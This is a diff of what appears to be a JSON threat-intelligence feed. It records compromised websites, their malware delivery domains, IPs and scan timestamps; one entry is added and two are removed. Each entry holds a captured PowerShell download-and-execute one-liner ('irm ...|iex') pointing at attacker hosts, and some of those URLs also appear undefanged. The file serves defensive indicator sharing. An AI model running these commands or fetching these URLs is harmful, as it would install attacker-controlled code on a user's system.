@@ -1,5 +1,32 @@
 [
   {
+    "UrlDomain": "k-landscape.com",
+    "DeliveryUrl": [
+      "cdn-speed.beer",
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.68.16.45"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/241f82e9da7d4c6c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=d1073f38e4c5855f8435c46194f7b1ad74b4065b42fb02cb&amp;_v=29920496",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/241f82e9da7d4c6c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/241f82e9da7d4c6c"
+    ],
+    "ReportId": "cmwpthx4023zn0omleyj7lhjr",
+    "ScannedAt": "2026-11-21T02:57:24.007000+00:00"
+  },
+  {
     "UrlDomain": "rsventure.in",
     "DeliveryUrl": [
       "makeverizyjar.info",
@@ -5656,43 +5683,5 @@
     ],
     "ReportId": "cmwlltm271k7m0omlj7e36c2f",
     "ScannedAt": "2026-11-18T04:11:27.895000+00:00"
-  },
-  {
-    "UrlDomain": "holyfamilymobility.ca",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/42dd3b56611904f4"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/42dd3b56611904f4')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/42dd3b56611904f4"
-    ],
-    "ReportId": "cmwlk2b0m1k450omldyolyil5",
-    "ScannedAt": "2026-11-18T03:22:14.273000+00:00"
-  },
-  {
-    "UrlDomain": "lucienebata.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/0164f0f9b6033a37"
-    ],
-    "IP": [
-      "92.205.248.102"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0164f0f9b6033a37')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/0164f0f9b6033a37"
-    ],
-    "ReportId": "cmwljnrpx1k140omlyyd1hsig",
-    "ScannedAt": "2026-11-18T03:10:56.101000+00:00"
   }
 ]
